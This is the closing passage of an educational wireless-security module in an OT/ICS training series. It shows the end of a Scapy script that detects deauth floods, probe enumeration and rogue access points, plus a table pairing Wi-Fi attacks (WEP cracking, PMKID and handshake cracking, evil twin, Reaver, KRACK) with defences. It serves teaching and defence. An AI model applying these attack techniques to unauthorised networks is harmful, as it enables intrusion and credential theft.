            print(f"[ALERT] DEAUTH FLOOD: {src} → {dst} ({deauth_count[src]} frames)")
            deauth_count[src] = 0  # Reset counter
    
    # Probe Request monitoring (PNL enumeration)
    if pkt.haslayer(Dot11ProbeReq):
        client = pkt.addr2
        ssid = pkt.info.decode('utf-8', errors='ignore')
        if ssid:
            probe_requests[client].add(ssid)
            if len(probe_requests[client]) > THRESHOLD_PROBES:
                print(f"[INFO] CLIENT {client} probing {len(probe_requests[client])} networks:")
                for s in probe_requests[client]:
                    print(f"       - {s}")
    
    # Rogue AP detection
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt.addr3
        try:
            ssid = pkt.info.decode('utf-8', errors='ignore')
        except:
            ssid = "unknown"
        
        if bssid not in seen_bssids:
            seen_bssids[bssid] = ssid
            if bssid not in AUTHORISED_APS:
                print(f"[NEW] Access Point: {bssid} SSID: '{ssid}'")
                # Check if SSID matches known SSID but BSSID is different:
                for auth_bssid, auth_ssid in AUTHORISED_APS.items():
                    if ssid == auth_ssid:
                        print(f"[ALERT] POSSIBLE ROGUE AP: '{ssid}' advertised by unauthorised BSSID {bssid}")

print("Starting wireless attack detection...")
print("Press Ctrl+C to stop")
print("Authorised APs:", AUTHORISED_APS)
print("")

# Requires monitor mode interface
sniff(iface="wlan0mon", prn=process_packet, store=0)
EOF

sudo python3 /tmp/detect_wireless.py
```

---

## 14. Module Summary

| Concept | Core Mechanism | Primary Attack | Key Defence | OT/ICS Relevance |
|---------|---------------|----------------|-------------|------------------|
| **802.11 Standards** | Radio modulation, MIMO, channel bonding | Match standard to expected protocol → identify WEP/WPA2 target | Latest standard (WPA3) + firmware updates | Legacy OT devices often 802.11b/g with WEP |
| **2.4 GHz** | Long range, high penetration, 3 non-overlap channels | Greater attack standoff distance, more interference | Minimise use for sensitive traffic | Dominant in industrial wireless sensors |
| **5 GHz** | Medium range, less interference, more channels | More channels = harder complete monitoring | Preferred for security-sensitive wireless | Engineering workstation access |
| **6 GHz** | Short range, WPA3 mandatory, 59 non-overlap channels | Limited attacker range | WPA3 required → eliminates WPA2 attacks | Emerging in modern OT infrastructure |
| **SSID** | Human-readable network name, broadcast in beacons | Spoofing (any AP can claim any SSID) | 802.1X enterprise auth (not SSID-dependent) | OT SSIDs reveal network structure |
| **BSSID** | MAC address of AP radio, spoofable in software | MAC spoofing for evil twin | WIDS monitoring known BSSID list | Identifying rogue APs in OT zones |
| **WEP** | RC4 + 24-bit IV, broken since 2001 | Aircrack-ng — cracked in <60 seconds | ELIMINATE immediately | Still found on legacy OT devices |
| **WPA** | TKIP/RC4, interim fix for WEP | Chop-chop, TKIP attacks | Upgrade to WPA2/WPA3 | Deprecated — eliminate |
| **WPA2-PSK** | 4-way handshake, PMKID, PBKDF2 password | Handshake capture + offline GPU crack, PMKID | Long random passwords (25+char), upgrade to WPA3 | Common in industrial environments |
| **WPA2-Enterprise** | 802.1X RADIUS, EAP types | Evil twin + rogue RADIUS, MSCHAPv2 crack | Certificate validation by supplicant, EAP-TLS | Jump server/HMI authentication |
| **WPA3** | SAE/Dragonfly, forward secrecy | Downgrade to WPA2 in transition mode, implementation bugs (Dragonblood) | WPA3-only mode, no WPA2 fallback | Recommended for new OT deployments |
| **Rogue AP** | Unauthorised AP connected to network | Physical access + Ethernet port connection | 802.1X on all switch ports, wireless survey | OT environment persistent rogue threat |
| **Evil Twin** | AP mimicking legitimate network SSID | Client auto-connect → MITM → credential capture | 802.1X enterprise auth, certificate validation, VPN kill switch | Engineering workstation attack vector |
| **Deauth Attack** | Forged management frames | Force client reconnection for handshake capture, DoS | 802.11w (Protected Management Frames), WPA3 | OT wireless sensor disruption risk |
| **WPS PIN** | 8-digit PIN split authentication | Reaver: 11,000 guesses max, Pixie Dust: seconds | Disable WPS entirely | OT APs should have WPS disabled |
| **KRACK** | 4-way handshake nonce reuse via message replay | Decrypt WPA2 traffic | OS patches (2017-2018), WPA3 | Unpatched OT systems still vulnerable |
| **WirelessHART** | IEEE 802.15.4, AES-128 mesh | Default join keys, eavesdropping | Unique per-device join keys, key rotation | Primary OT sensor networking technology |
| **Zigbee** | IEEE 802.15.4, AES-128 with poor key management | Default trust center key, network key extraction | Unique link keys, disable trust center link key | Building automation, some industrial |

---

> **Next Module:** [Stage 1.8 — Network Analysis Tools](./stage-1.8-network-analysis-tools.md)  
> **Previous Module:** [Stage 1.6 — Network Devices](./stage-1.6-network-devices.md)  
> **Series Index:** [Full Roadmap](../../README.md)

---

*This document is part of the Cybersecurity × OT/ICS Security Full Roadmap series. All techniques are presented for educational purposes, authorised security research, and defensive security practice. Always obtain proper authorisation before testing any system.*